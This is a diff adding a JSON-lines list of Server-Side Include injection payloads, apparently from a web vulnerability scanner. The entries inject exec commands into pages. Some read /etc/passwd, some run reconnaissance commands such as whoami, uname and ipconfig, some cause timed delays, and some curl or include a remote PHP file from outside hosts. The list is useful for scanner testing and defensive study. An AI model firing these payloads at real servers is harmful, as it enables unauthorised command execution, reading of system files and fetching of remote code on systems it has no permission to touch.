@@ -1,0 +1,18 @@
+{"payload": "<!--#exec cmd=\"cat /etc/passwd\" -->", "type": "SSI"}
+{"payload": "<!--#exec cmd=\"curl http://sn1persecurity.com/.testing/rfi_vuln.php\" -->", "type": "SSI"}
+{"payload": "<!--#exec cmd=\"ls\" -->", "type": "SSI"}
+{"payload": "<!--#exec cmd=\"ipconfig\" -->", "type": "SSI"}
+{"payload": "<!--#echo var=\"DOCUMENT_NAME\" -->", "type": "SSI"}
+{"payload": "<!--#exec cmd=\"dir\" -->", "type": "SSI"}
+{"payload": "</nowiki>", "type": "SSI"}
+{"payload": "<!--#exec cmd=\"sleep 10\" -->", "type": "SSI"}
+{"payload": "<!--#config timefmt=\"A %B %d %Y %r\"-->", "type": "SSI"}
+{"payload": "<!--#include virtual=\"http://sn1persecurity.com/.testing/rfi_vuln.php\" -->", "type": "SSI"}
+{"payload": "<!--#echo var=\"DOCUMENT_URI\" -->", "type": "SSI"}
+{"payload": "<!--#include virtual=\"https://crowdshield.com/.testing/rfi_vuln.php\" -->", "type": "SSI"}
+{"payload": "<!--#exec cmd=\"whoami\" -->", "type": "SSI"}
+{"payload": "<!--#exec cmd=\"perl -e 'print \"X\"*5000'\" -->", "type": "SSI"}
+{"payload": "<!--#exec cmd=\"sleep 5\" -->", "type": "SSI"}
+{"payload": "<!--#include virtual=\"/\" -->", "type": "SSI"}
+{"payload": "<!--#echo var=\"DATE_LOCAL\" -->", "type": "SSI"}
+{"payload": "<!--#exec cmd=\"uname\" -->", "type": "SSI"}
